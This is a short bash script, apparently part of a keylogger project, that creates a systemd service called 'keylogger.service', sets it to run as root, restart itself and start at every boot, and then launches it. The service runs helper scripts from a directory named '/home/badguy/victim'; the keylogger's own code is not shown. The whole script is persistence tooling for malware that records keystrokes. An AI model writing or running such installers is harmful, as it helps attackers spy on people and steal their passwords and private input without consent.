#!/bin/bash

PROJECT_DIR="/home/badguy/victim"

# One-time install: create and enable service if missing
if [ ! -f /etc/systemd/system/keylogger.service ]; then
    sudo bash -c "cat > /etc/systemd/system/keylogger.service <<EOF
[Unit]
Description=Keylogger client + kernel module (script-driven)
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$PROJECT_DIR
ExecStart=$PROJECT_DIR/klrun.sh
ExecStop=$PROJECT_DIR/klstop.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF"

    sudo systemctl daemon-reload
    sudo systemctl enable keylogger.service
fi

# Start the service (systemd will now run klrun.sh)
sudo systemctl start keylogger.service
echo "[+] keylogger service started"